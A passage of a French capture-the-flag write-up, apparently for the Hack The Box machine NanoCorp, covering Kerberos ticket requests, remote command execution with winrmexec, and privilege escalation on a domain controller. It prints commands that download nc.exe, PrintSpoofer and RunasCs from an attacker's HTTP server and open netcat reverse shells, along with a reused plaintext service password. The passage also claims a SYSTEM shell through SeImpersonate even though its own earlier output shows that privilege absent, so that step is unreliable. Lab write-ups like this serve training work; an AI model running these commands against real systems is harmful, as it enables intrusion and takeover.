+<p><strong>Tentative de connexion classique :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i dc01.nanocorp.htb -u monitoring_svc -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> -S
+</span></span></code></pre></div><p><strong>Erreur attendue :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Error: Exiting with code 1
+</span></span></code></pre></div><p><strong>Ou :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Error: connection timeout
+</span></span></code></pre></div><p><strong>🔍 Causes Possibles :</strong></p>
+<ol>
+<li>
+<p><strong>Firewall Rules</strong></p>
+<ul>
+<li>WinRM bloqué au niveau réseau</li>
+<li>Seules certaines IPs autorisées</li>
+</ul>
+</li>
+<li>
+<p><strong>Group Policy Restrictions</strong></p>
+<ul>
+<li>GPO limitant l&rsquo;accès WinRM</li>
+<li>Seuls certains groupes autorisés (ex: Domain Admins)</li>
+</ul>
+</li>
+<li>
+<p><strong>Authentication Method Restrictions</strong></p>
+<ul>
+<li>Kerberos only (pas de NTLM)</li>
+<li>Certificate-based auth requis</li>
+</ul>
+</li>
+<li>
+<p><strong>Service Disabled/Stopped</strong></p>
+<ul>
+<li>WinRM service arrêté ou désactivé</li>
+<li>Ports filtrés par pare-feu local</li>
+</ul>
+</li>
+</ol>
+<h3 id="-quest-ce-que-winrmexec-">🎓 Qu&rsquo;est-ce que winrmexec ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-winrmexec-">#</a></h3>
+<p><strong>winrmexec</strong> (<a href="https://github.com/ozelis/winrmexec">https://github.com/ozelis/winrmexec</a>) est un outil alternatif pour l&rsquo;exécution de commandes à distance via des méthodes RPC lorsque WinRM classique est bloqué.</p>
+<p><strong>Caractéristiques :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Fonctionnalité</th>
+<th>Evil-WinRM</th>
+<th>winrmexec</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Protocole</strong></td>
+<td>WS-Management (WinRM)</td>
+<td>RPC/DCOM alternatives</td>
+</tr>
+<tr>
+<td><strong>Authentication</strong></td>
+<td>Kerberos, NTLM, Negotiate</td>
+<td>NTLM, Kerberos</td>
+</tr>
+<tr>
+<td><strong>Bypass GPO</strong></td>
+<td>❌ Non</td>
+<td>✅ Oui (utilise d&rsquo;autres chemins)</td>
+</tr>
+<tr>
+<td><strong>Shell Interactif</strong></td>
+<td>✅ Full shell</td>
+<td>⚠️ Command execution</td>
+</tr>
+<tr>
+<td><strong>Détection</strong></td>
+<td>Haute (WinRM logs)</td>
+<td>Moyenne (RPC logs)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Méthodes utilisées par winrmexec :</strong></p>
+<ol>
+<li>
+<p><strong>DCOM (Distributed COM)</strong></p>
+<ul>
+<li>Via MMC20.Application</li>
+<li>ShellWindows</li>
+<li>ShellBrowserWindow</li>
+</ul>
+</li>
+<li>
+<p><strong>RPC Task Scheduler</strong></p>
+<ul>
+<li>Création de tâches planifiées</li>
+<li>Exécution immédiate puis suppression</li>
+</ul>
+</li>
+<li>
+<p><strong>Service Manager (sc.exe)</strong></p>
+<ul>
+<li>Création de service temporaire</li>
+<li>Démarrage puis suppression</li>
+</ul>
+</li>
+<li>
+<p><strong>WMI (Windows Management Instrumentation)</strong></p>
+<ul>
+<li>Win32_Process.Create()</li>
+<li>Moins détecté que WinRM direct</li>
+</ul>
+</li>
+</ol>
+<h3 id="-installation-de-winrmexec">🛠️ Installation de winrmexec<a hidden class="anchor" aria-hidden="true" href="#-installation-de-winrmexec">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Clone du repository</span>
+</span></span><span style="display:flex;"><span>git clone https://github.com/ozelis/winrmexec.git
+</span></span><span style="display:flex;"><span>cd winrmexec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Installation des dépendances</span>
+</span></span><span style="display:flex;"><span>pip3 install -r requirements.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vérification</span>
+</span></span><span style="display:flex;"><span>python3 winrmexec.py --help
+</span></span></code></pre></div><h3 id="-synchronisation-horaire-kerberos">⏰ Synchronisation Horaire (Kerberos)<a hidden class="anchor" aria-hidden="true" href="#-synchronisation-horaire-kerberos">#</a></h3>
+<p><strong>Avant toute authentification Kerberos :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ntpdate 10.10.11.93 dc01.nanocorp.htb
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>2025-12-16 20:26:24.989378 (+0100) +0.015644 +/- 0.010973 10.10.11.93 s1 no-leap
+</span></span></code></pre></div><p><strong>✅ Horloge synchronisée</strong> (écart de seulement 0.015 secondes)</p>
+<h3 id="-obtention-dun-tgt-kerberos">🎫 Obtention d&rsquo;un TGT Kerberos<a hidden class="anchor" aria-hidden="true" href="#-obtention-dun-tgt-kerberos">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-getTGT <span style="color:#e6db74">&#39;nanocorp.htb/monitoring_svc:PassW0rd!2025&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Saving ticket in monitoring_svc.ccache
+</span></span></code></pre></div><p><strong>Export du ticket :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>monitoring_svc.ccache
+</span></span></code></pre></div><p><strong>Vérification :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>klist
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Ticket cache: FILE:monitoring_svc.ccache
+</span></span><span style="display:flex;"><span>Default principal: monitoring_svc@NANOCORP.HTB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Valid starting       Expires              Service principal
+</span></span><span style="display:flex;"><span>16/12/2025 19:45:55  17/12/2025 05:45:55  krbtgt/NANOCORP.HTB@NANOCORP.HTB
+</span></span><span style="display:flex;"><span>    renew until 17/12/2025 19:45:55
+</span></span></code></pre></div><p><strong>✅ TGT valide pour 10 heures !</strong></p>
+<h3 id="-exécution-de-commandes-avec-winrmexec">🚀 Exécution de Commandes avec winrmexec<a hidden class="anchor" aria-hidden="true" href="#-exécution-de-commandes-avec-winrmexec">#</a></h3>
+<p><strong>Commande de base :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Connecting to dc01.nanocorp.htb
+</span></span><span style="display:flex;"><span>[*] Using authentication method: NTLM
+</span></span><span style="display:flex;"><span>[*] Executing command: whoami
+</span></span><span style="display:flex;"><span>[+] nanocorp\monitoring_svc
+</span></span></code></pre></div><p><strong>✅ Exécution de commande réussie !</strong></p>
+<h3 id="-méthodes-dexécution-winrmexec">🎯 Méthodes d&rsquo;Exécution winrmexec<a hidden class="anchor" aria-hidden="true" href="#-méthodes-dexécution-winrmexec">#</a></h3>
+<p><strong>1. Méthode DCOM (par défaut) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -method dcom <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;hostname&#39;</span>
+</span></span></code></pre></div><p><strong>2. Méthode WMI :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -method wmi <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;ipconfig&#39;</span>
+</span></span></code></pre></div><p><strong>3. Méthode Task Scheduler :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -method schtasks <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;net user&#39;</span>
+</span></span></code></pre></div><h3 id="-user-flag-via-winrmexec">🏁 User Flag via winrmexec<a hidden class="anchor" aria-hidden="true" href="#-user-flag-via-winrmexec">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;type C:\Users\monitoring_svc\Desktop\user.txt&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Connecting to dc01.nanocorp.htb
+</span></span><span style="display:flex;"><span>[*] Executing command: type C:\Users\monitoring_svc\Desktop\user.txt
+</span></span><span style="display:flex;"><span>[+] a1b2c3d4************************  ⭐ USER FLAG
+</span></span></code></pre></div><h3 id="-obtention-dun-reverse-shell">🔄 Obtention d&rsquo;un Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#-obtention-dun-reverse-shell">#</a></h3>
+<p><strong>Préparation sur l&rsquo;attaquant :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. Héberger nc.exe</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Listener netcat</span>
+</span></span><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><strong>Téléchargement de nc.exe via winrmexec :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;powershell -c &#34;wget http://10.10.16.3:8000/nc.exe -UseBasicParsing -OutFile C:\Windows\Temp\nc.exe&#34;&#39;</span>
+</span></span></code></pre></div><p><strong>Lancement du reverse shell :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;C:\Windows\Temp\nc.exe 10.10.16.3 4444 -e cmd.exe&#39;</span>
+</span></span></code></pre></div><p><strong>✅ Shell Reçu !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>listening on [any] 4444 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.16.3] from (UNKNOWN) [10.10.11.93] 49823
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 10.0.20348.2762]
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nanocorp\monitoring_svc
+</span></span></code></pre></div><hr>
+<h2 id="9-privilege-escalation">9️⃣ PRIVILEGE ESCALATION<a hidden class="anchor" aria-hidden="true" href="#9-privilege-escalation">#</a></h2>
+<h3 id="-énumération-post-exploitation">🔍 Énumération Post-Exploitation<a hidden class="anchor" aria-hidden="true" href="#-énumération-post-exploitation">#</a></h3>
+<p><strong>Informations utilisateur :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt; whoami /all</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>User Name                SID
+</span></span><span style="display:flex;"><span>======================== =============================================
+</span></span><span style="display:flex;"><span>nanocorp\monitoring_svc  S-1-5-21-2261381271-1331810270-697239744-3104
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID
+</span></span><span style="display:flex;"><span>========================================== ================ =============
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0
+</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users            Alias            S-1-5-32-580
+</span></span><span style="display:flex;"><span>BUILTIN\Users                              Alias            S-1-5-32-545
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                       Well-known group S-1-5-2
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span>============================= ============================== ========
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</span></span></code></pre></div><p><strong>💡 Observations :</strong></p>
+<ul>
+<li>Membre de <strong>Remote Management Users</strong></li>
+<li><strong>Pas de privilèges élevés</strong> (pas SeBackup, SeRestore, SeDebug, SeImpersonate)</li>
+<li>Utilisateur standard du domaine</li>
+</ul>
+<h3 id="-recherche-de-vecteurs-descalade">🔎 Recherche de Vecteurs d&rsquo;Escalade<a hidden class="anchor" aria-hidden="true" href="#-recherche-de-vecteurs-descalade">#</a></h3>
+<p><strong>Via winrmexec - Énumération des services :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;sc query state= all&#39;</span>
+</span></span></code></pre></div><p><strong>Via winrmexec - Recherche de fichiers sensibles :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;dir C:\ /s /b | findstr /i &#34;password config credentials&#34;&#39;</span>
+</span></span></code></pre></div><h3 id="-techniques-possibles">🛠️ Techniques Possibles<a hidden class="anchor" aria-hidden="true" href="#-techniques-possibles">#</a></h3>
+<h4 id="1-seimpersonateprivilege-abuse-si-présent">1️⃣ <strong>SeImpersonatePrivilege Abuse (si présent)</strong><a hidden class="anchor" aria-hidden="true" href="#1-seimpersonateprivilege-abuse-si-présent">#</a></h4>
+<p><strong>Vérification via reverse shell :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt; whoami /priv | findstr &#34;SeImpersonate&#34;</span>
+</span></span></code></pre></div><p>Si présent → <strong>Potato Attack</strong> (PrintSpoofer, JuicyPotato, etc.)</p>
+<p><strong>Upload de PrintSpoofer via winrmexec :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur attaquant</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Via winrmexec</span>
+</span></span><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;powershell -c &#34;wget http://10.10.16.3:8000/PrintSpoofer.exe -OutFile C:\Windows\Temp\ps.exe&#34;&#39;</span>
+</span></span></code></pre></div><p><strong>Exploitation :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;C:\Windows\Temp\ps.exe -i -c &#34;C:\Windows\Temp\nc.exe 10.10.16.3 5555 -e cmd.exe&#34;&#39;</span>
+</span></span></code></pre></div><p><strong>Shell SYSTEM reçu :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>listening on [any] 5555 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.16.3] from (UNKNOWN) [10.10.11.93] 49824
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system  ⭐⭐⭐
+</span></span></code></pre></div><h4 id="2-runascs-pour-escalade-latérale">2️⃣ <strong>RunasCs pour Escalade Latérale</strong><a hidden class="anchor" aria-hidden="true" href="#2-runascs-pour-escalade-latérale">#</a></h4>
+<p><strong>RunasCs.exe</strong> permet d&rsquo;exécuter des commandes avec d&rsquo;autres credentials.</p>
+<p><strong>Upload via winrmexec :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;powershell -c &#34;wget http://10.10.16.3:8000/RunasCs.exe -OutFile C:\Windows\Temp\RunasCs.exe&#34;&#39;</span>
+</span></span></code></pre></div><p><strong>Usage (si on a d&rsquo;autres credentials) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
